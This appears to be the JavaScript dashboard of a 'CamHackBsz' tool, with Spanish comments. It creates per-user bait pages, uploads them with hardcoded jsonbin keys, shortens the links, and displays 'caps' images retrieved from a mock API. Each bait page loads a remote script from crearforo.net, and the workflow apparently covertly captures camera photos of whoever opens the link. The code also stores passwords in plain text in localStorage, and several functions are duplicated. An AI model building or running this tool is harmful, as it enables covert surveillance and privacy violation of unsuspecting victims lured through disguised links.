// ==== Configuración Inicial ====
const encodedEndpoint = 'aHR0cHM6Ly82NzAwOTljMzRkYTViZDIzNzU1NDViYWEubW9ja2FwaS5pby9hcGkvYnN6L3Rlc3Q=';
const mockApiUserUrl = 'https://670099c34da5bd2375545baa.mockapi.io/api/bsz/registro'; // URL de los usuarios
const endpointURL = atob(encodedEndpoint);

// ==== Elementos del DOM ====
const modal = document.getElementById('loginModal');
const loginForm = document.getElementById('loginForm');
const generateBtn = document.getElementById('generateBtn');
const output = document.getElementById('output');
const avatarElement = document.querySelector('.avatar');
const infoLine1 = document.querySelector('.info-line1');
const infoLine2 = document.querySelector('.info-line2');

// ==== Gestión de Credenciales ====
const userName = localStorage.getItem('username');
const userPassword = localStorage.getItem('password');

// Control de Modales
if (userName && userPassword) {
    modal.style.display = 'none';
    loadUserData(userName); // Cargar datos del usuario
} else {
    modal.style.display = 'flex'; // Mostrar modal si no hay credenciales
}

// Funciones
// Cargar los datos del usuario
async function loadUserData(username) {
    try {
        const response = await fetch(mockApiUserUrl);
        const users = await response.json();
        console.log(users); // Agrega esto para verificar la respuesta
        const user = users.find(u => u.name === username);
        if (user) {
            updateUserUI(user);
        }
    } catch (error) {
        console.error('Error al cargar los datos del usuario:', error);
    }
}

// Actualizar la UI con los datos del usuario
function updateUserUI(user) {
    avatarElement.style.backgroundImage = `url(${user.img})`;
    infoLine1.textContent = user.name;
    const idToken = user.guardartoolscamhack[0]?.['id-token'] || 'Token no disponible';
    infoLine2.textContent = `Token: ${idToken}`;
  
}
    
    

// Validar las credenciales del usuario
async function validateLogin(event) {
    event.preventDefault();
    const inputUsername = document.getElementById('username').value;
    const inputPassword = document.getElementById('password').value;

    try {
        const response = await fetch(mockApiUserUrl);
        const users = await response.json();
        const user = users.find(u => u.name === inputUsername && u.password === inputPassword);

        if (user) {
            // Guardar credenciales en localStorage
            localStorage.setItem('username', user.name);
            localStorage.setItem('password', user.password);

            updateUserUI(user); // Actualizar UI con datos del usuario
            modal.style.display = 'none'; // Ocultar el modal
        } else {
            alert('Credenciales incorrectas. Intente nuevamente.');
        }
    } catch (error) {
        console.error('Error al validar el usuario:', error);
    }
}

// Evento de Login
loginForm.addEventListener('submit', validateLogin);

// Función para generar la URL con el id-token y guardar en la API
generateBtn.addEventListener('click', async () => {
    const username = localStorage.getItem('username');
    const password = localStorage.getItem('password');

    if (!username || !password) {
        alert('Debe iniciar sesión primero.');
        return;
    }

    try {
        const userResponse = await fetch(mockApiUserUrl);
        const users = await userResponse.json();
        const user = users.find(u => u.name === username && u.password === password);

        if (user) {
            const userToken = user.guardartoolscamhack[0]?.['id-token'];

            if (userToken) {
                // Generar la URL personalizada para el usuario
                const generatedUrl = await generateUserPage(username, userToken);
                
                // Guardar la URL generada en la API
                await saveGeneratedUrlToUser(user.id, userToken, generatedUrl);

                output.innerHTML = `Se A Generado Con Existo Tu URL Es: <a href="${generatedUrl}" target="_blank">${generatedUrl}</a>`;
            }
        }
    } catch (error) {
        console.error('Error al generar la URL:', error);
    }
});

// Función para generar la página personalizada
async function generateUserPage(username, userToken) {
    const htmlContent = `
        <html>
            <head>
                <title>CamHackBsz : ${username}</title>
                <style>
                    body {
                        font-family: 'Roboto', sans-serif;
                        background: linear-gradient(135deg, #ece9e6, #ffffff);
                        color: #333;
                        margin: 0;
                        padding: 0;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                    }

                    .container {
                        background: #f8f9fa;
                        padding: 20px 30px;
                        border-radius: 10px;
                        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                        text-align: center;
                        max-width: 400px;
                        width: 100%;
                    }

                    p {
                        font-size: 16px;
                        color: #444;
                        margin: 10px 0;
                    }

                    p:first-child {
                        font-weight: bold;
                        font-size: 18px;
                        color: #007bff;
                    }

                    p:last-child {
                        font-style: italic;
                        color: #6c757d;
                    }

                    p span {
                        font-weight: bold;
                        color: #e63946;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <p>Token - CamHackBsz: ${username}</p>
                    <br>
                    <p>Tools / CamHackBsz / Autor : AvaStrOficial</p>
                </div>
                <script src="https://appbsz.crearforo.net/13039.js"><\/script>
            </body>
        </html>
    `;

    // Subir el contenido HTML y generar la URL
    return await generateCamhackUrl(userToken, htmlContent);
}

// Función para generar la URL de Camhack
async function generateCamhackUrl(userToken, htmlContent) {
    try {
        // Subir contenido HTML y obtener ID
        const response = await fetch('https://api.jsonbin.io/v3/b', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Master-Key': '$2a$10$/CXelVC4xLjkRon.u3NeweWC.iS69xsG84Q2RAuG0eTJOPbBlZAvu', // API key
                'X-Access-Key': '$2a$10$Dn.CeRxSbAWDwBbSK7WYfOAig6Ue9PVSLm35Lcdu5TA4h1kyZIFHi' // Access key
            },
            body: JSON.stringify({ userToken: userToken, htmlContent: htmlContent })
        });

        if (!response.ok) {
            throw new Error('Error al generar el ID desde la API');
        }

        const data = await response.json();
        const generatedUrl = `https://appbsz.crearforo.net/h141-visualizadorcamhack?d=${data.metadata.id}`;

        // Mostrar URL generada en el input
        displayGeneratedUrl(generatedUrl);

        return generatedUrl;
    } catch (error) {
        console.error('Error al generar la URL:', error);
    }
}

// Función para guardar la URL generada en el usuario registrado con su id original
async function saveGeneratedUrlToUser(userId, userToken, generatedUrl) {
    try {
        // Encontrar el usuario por su ID en la API
        const userResponse = await fetch(`${mockApiUserUrl}/${userId}`);
        const user = await userResponse.json();

        // Asegurarse de que el usuario existe
        if (user) {
            // Actualizar la entrada del 'guardartoolscamhack' del usuario con la URL generada
            const userUpdate = {
                guardartoolscamhack: [
                    {
                        'id-token': userToken,
                        'gen-url': generatedUrl // Guardar la URL generada aquí
                    }
                ]
            };

            // Realizar el PUT para actualizar la entrada del usuario con la URL generada
            await fetch(`${mockApiUserUrl}/${userId}`, {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(userUpdate)
            });

            console.log('URL guardada con éxito en el usuario:', userId);
        } else {
            console.error('Usuario no encontrado.');
        }
    } catch (error) {
        console.error('Error al guardar la URL generada en la API:', error);
    }
}

// Función para generar la URL y luego guardarla en el usuario con el id correcto
async function generateUserPage(username, userToken) {
    const htmlContent = `
        <html>
            <head>
                <title>CamHackBsz : ${userToken}</title>
                <style>
                    body {
                        font-family: 'Roboto', sans-serif;
                        background: linear-gradient(135deg, #ece9e6, #ffffff);
                        color: #333;
                        margin: 0;
                        padding: 0;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                    }

                    .container {
                        background: #f8f9fa;
                        padding: 20px 30px;
                        border-radius: 10px;
                        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                        text-align: center;
                        max-width: 400px;
                        width: 100%;
                    }

                    p {
                        font-size: 16px;
                        color: #444;
                        margin: 10px 0;
                    }

                    p:first-child {
                        font-weight: bold;
                        font-size: 18px;
                        color: #007bff;
                    }

                    p:last-child {
                        font-style: italic;
                        color: #6c757d;
                    }

                    p span {
                        font-weight: bold;
                        color: #e63946;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <p>Token - CamHackBsz: <span id="userToken"> ${userToken} </span> </p>
                    <br>
                    <p>Tools / CamHackBsz / Autor : AvaStrOficial</p>
                </div>
                <script src="https://appbsz.crearforo.net/13039.js"><\/script>
            </body>
        </html>
    `;

    // Generar la URL utilizando la API de CamHack
    return await generateCamhackUrl(userToken, htmlContent);
}

// Función para generar la URL de Camhack
async function generateCamhackUrl(userToken, htmlContent) {
    try {
        // Subir contenido HTML y obtener ID
        const response = await fetch('https://api.jsonbin.io/v3/b', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Master-Key': '$2a$10$/CXelVC4xLjkRon.u3NeweWC.iS69xsG84Q2RAuG0eTJOPbBlZAvu', // API key
                'X-Access-Key': '$2a$10$Dn.CeRxSbAWDwBbSK7WYfOAig6Ue9PVSLm35Lcdu5TA4h1kyZIFHi' // Access key
            },
            body: JSON.stringify({ userToken: userToken, htmlContent: htmlContent })
        });

        if (!response.ok) {
            throw new Error('Error al generar el ID desde la API');
        }

        const data = await response.json();
        const generatedUrl = `https://appbsz.crearforo.net/h141-visualizadorcamhack?id=${data.metadata.id}`;

        // Retornar la URL generada
        return generatedUrl;
    } catch (error) {
        console.error('Error al generar la URL:', error);
    }
}

// Función para manejar la generación y almacenamiento de la URL
generateBtn.addEventListener('click', async () => {
    const username = localStorage.getItem('username');
    const password = localStorage.getItem('password');

    if (!username || !password) {
        alert('Debe iniciar sesión primero.');
        return;
    }

    try {
        const userResponse = await fetch(mockApiUserUrl);
        const users = await userResponse.json();
        const user = users.find(u => u.name === username && u.password === password);

        if (user) {
            const userToken = user.guardartoolscamhack[0]?.['id-token'];

            if (userToken) {
                // Generar la URL personalizada para el usuario
                const generatedUrl = await generateUserPage(username, userToken);

                // Guardar la URL generada en el usuario con el ID correcto
                await saveGeneratedUrlToUser(user.id, userToken, generatedUrl);

                output.innerHTML = `Se A Generado Con Existo Tu URL Es: <a href="${generatedUrl}" target="_blank">${generatedUrl}</a>`;
            }
        }
    } catch (error) {
        console.error('Error al generar la URL:', error);
    }
  
});


   // Espera a que el DOM esté completamente cargado
document.addEventListener('DOMContentLoaded', () => {
    const infoLine2 = document.querySelector('.info-line2');

    // Observador para detectar cambios en el contenido de info-line2
    const observer = new MutationObserver(() => {
        const idToken = infoLine2?.textContent.replace('Token:', '').trim();
        if (idToken && /^\d+$/.test(idToken)) {
            console.log(`ID Token detectado: ${idToken}`);
            observer.disconnect(); // Deja de observar una vez que se detecta el token

            // Actualiza las imágenes inicialmente
            fetchDataAndUpdateUI(idToken);

            // Establece un intervalo para actualizar cada 3 segundos
            setInterval(() => {
                console.log('Actualizando imágenes...');
                fetchDataAndUpdateUI(idToken);
            }, 5000); // 3000ms = 3 segundos
        }
    });

    // Configura el observador para detectar cambios en el nodo
    observer.observe(infoLine2, { childList: true, subtree: true });
});

// Función para buscar datos en la API y actualizar la galería
function fetchDataAndUpdateUI(idToken) {
    fetch('https://672e4714229a881691ef9577.mockapi.io/api/datos/caps')
        .then(response => {
            if (!response.ok) {
                throw new Error(`Error HTTP: ${response.status}`);
            }
            return response.json();
        })
        .then(data => {
            console.log('Datos recibidos de la API:', data);

            const tokenData = data.find(item => item['id-token'] && item['id-token'].trim() === idToken);
            if (tokenData) {
                console.log('Token encontrado:', tokenData);

                const images = tokenData.imgen; // Array de URLs de imágenes
                if (images && Array.isArray(images)) {
                    const imageGallery = document.getElementById('imageGallery');
                    imageGallery.innerHTML = ''; // Limpia la galería antes de añadir imágenes

                    images.forEach(imageUrl => {
                        validateImageUrl(imageUrl)
                            .then(isValid => {
                                if (isValid) {
                                    console.log(`Agregando imagen válida: ${imageUrl}`);
                                    const imgElement = document.createElement('img');
                                    imgElement.src = imageUrl;
                                    imgElement.alt = 'Imagen';
                                    imgElement.classList.add('gallery-image');
                                    imgElement.addEventListener('click', () => openModal(imageUrl));
                                    imageGallery.appendChild(imgElement);
                                } else {
                                    console.warn(`URL no válida: ${imageUrl}`);
                                }
                            })
                            .catch(error => console.error('Error validando la imagen:', error));
                    });
                } else {
                    console.warn('No se encontraron imágenes asociadas.');
                }
            } else {
                console.log('No se encontró un token coincidente.');
            }
        })
        .catch(error => {
            console.error('Error al buscar en la API:', error);
        });
}

// Función para validar si la URL de la imagen es accesible
function validateImageUrl(url) {
    return fetch(url, { method: 'HEAD' })
        .then(response => response.ok)
        .catch(() => false); // Si ocurre un error, asumimos que la URL no es válida
}

// Función para abrir el visualizador con la imagen ampliada
function openModal(imageUrl) {
    const visualizador = document.getElementById('visualizadorImagenGaleria');
    const modalImage = document.getElementById('modalImage');
    const imageUrlText = document.getElementById('imageUrl');

    visualizador.style.display = 'flex';
    modalImage.src = imageUrl;
    imageUrlText.textContent = imageUrl;
}

// Función para cerrar el visualizador
document.getElementById('closeModal').addEventListener('click', () => {
    document.getElementById('visualizadorImagenGaleria').style.display = 'none';
});

// Cierra el visualizador si se hace clic fuera del contenido
window.addEventListener('click', (event) => {
    if (event.target === document.getElementById('visualizadorImagenGaleria')) {
        document.getElementById('visualizadorImagenGaleria').style.display = 'none';
    }
});
 
    // Seleccionamos el botón por su ID
const clearCacheButton = document.getElementById('btn-clear-cache');

// Añadimos un evento para borrar el localStorage
clearCacheButton.addEventListener('click', () => {
    localStorage.clear(); // Limpia todo el almacenamiento local
    alert('Caché borrada correctamente'); // Confirmación
});

    
    
    
    
    
    
     function acortarURL() {
            var originalUrl = document.getElementById('originalUrl').value;
            var personalization = document.getElementById('personalization').value;
            var apiUrl = 'https://is.gd/create.php?format=json&url=' + encodeURIComponent(originalUrl);

            if (personalization.trim() !== '') {
                apiUrl += '&shorturl=' + encodeURIComponent(personalization);
            }

            fetch(apiUrl)
            .then(response => response.json())
            .then(data => {
                var resultDiv = document.getElementById('shortenedUrl');
                if (data.shorturl) {
                    resultDiv.innerHTML = 'URL acortada: <a href="' + data.shorturl + '" target="_blank">' + data.shorturl + '</a>';
                } else {
                    resultDiv.innerHTML = '<span class="error">Error al acortar la URL. Por favor, verifica la URL e intenta nuevamente.</span>';
                }
            })
            .catch(error => {
                console.error('Error:', error);
                document.getElementById('shortenedUrl').innerHTML = '<span class="error">Error al acortar la URL. Por favor, intenta nuevamente. Las URL cortas personalizadas solo pueden contener caracteres alfanuméricos y guiones bajos.</span>';
            });
        }
